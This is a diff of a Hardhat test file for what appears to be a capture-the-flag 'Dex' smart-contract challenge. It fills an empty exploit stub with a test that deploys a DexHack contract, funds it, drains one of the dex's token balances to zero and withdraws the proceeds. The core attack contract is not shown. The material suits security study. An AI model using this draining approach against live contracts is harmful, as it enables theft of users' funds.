@@ -4,9 +4,9 @@ import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signer-wit
 
 describe("Dex Exploit", function () {
   var deployer: SignerWithAddress, attacker: SignerWithAddress;
-  const INITIAL_MINT_TOKEN = ethers.utils.parseEther('10000000');
-  const INITIAL_DEX_BALANCE = ethers.utils.parseEther('100');
-  const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther('10');
+  const INITIAL_MINT_TOKEN = ethers.utils.parseEther("10000000");
+  const INITIAL_DEX_BALANCE = ethers.utils.parseEther("100");
+  const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther("10");
   before(async function () {
     [deployer, attacker] = await ethers.getSigners();
 
@@ -37,18 +37,56 @@ describe("Dex Exploit", function () {
     expect(await this.dex.token2()).to.be.eq(this.token2.address);
   });
 
-  it("Should have attacker balances set correctly", async function checkAttackerBalance(){
-    expect(await this.token1.balanceOf(attacker.address)).to.eq(INITIAL_ATTACKER_BALANCE);
-    expect(await this.token2.balanceOf(attacker.address)).to.eq(INITIAL_ATTACKER_BALANCE);
-  })
+  it("Should have attacker balances set correctly", async function checkAttackerBalance() {
+    expect(await this.token1.balanceOf(attacker.address)).to.eq(
+      INITIAL_ATTACKER_BALANCE
+    );
+    expect(await this.token2.balanceOf(attacker.address)).to.eq(
+      INITIAL_ATTACKER_BALANCE
+    );
+  });
 
-  it("Should have Dex balance set correctly", async function checkDexBalance(){
-    expect(await this.token1.balanceOf(this.dex.address)).to.eq(INITIAL_DEX_BALANCE); 
-    expect(await this.token2.balanceOf(this.dex.address)).to.eq(INITIAL_DEX_BALANCE);
-  })
-  it("Should Exploit", async function exploit(){
-    /**
-     * Your Exploit code here!
-     */
-  })
+  it("Should have Dex balance set correctly", async function checkDexBalance() {
+    expect(await this.token1.balanceOf(this.dex.address)).to.eq(
+      INITIAL_DEX_BALANCE
+    );
+    expect(await this.token2.balanceOf(this.dex.address)).to.eq(
+      INITIAL_DEX_BALANCE
+    );
+  });
+  it("Should drain the dex contract", async function exploit() {
+    this.exploit = await (
+      await ethers.getContractFactory("DexHack", attacker)
+    ).deploy(this.dex.address, this.token1.address, this.token2.address);
+
+    // Transfer the money to the exploit contract
+    await this.token1
+      .connect(attacker)
+      .transfer(this.exploit.address, this.token1.balanceOf(attacker.address));
+    await this.token2
+      .connect(attacker)
+      .transfer(this.exploit.address, this.token2.balanceOf(attacker.address));
+
+    expect(await this.token1.balanceOf(attacker.address)).to.eq(0);
+    expect(await this.token2.balanceOf(attacker.address)).to.eq(0);
+
+    expect(await this.token1.balanceOf(this.exploit.address)).to.be.gt(0);
+    expect(await this.token2.balanceOf(this.exploit.address)).to.be.gt(0);
+
+    await this.exploit.exploit();
+
+    let dexToken1Balance = await this.token1.balanceOf(this.dex.address);
+    let dexToken2Balance = await this.token2.balanceOf(this.dex.address);
+
+    expect(dexToken1Balance == 0 || dexToken2Balance == 0).to.be.true;
+
+    // Take the tokens from the exploit contract
+    await this.exploit.withdraw();
+
+    expect(await this.token1.balanceOf(attacker.address)).to.be.gt(0);
+    expect(await this.token2.balanceOf(attacker.address)).to.be.gt(0);
+
+    expect(await this.token1.balanceOf(this.exploit.address)).to.eq(0);
+    expect(await this.token2.balanceOf(this.exploit.address)).to.eq(0);
+  });
 });
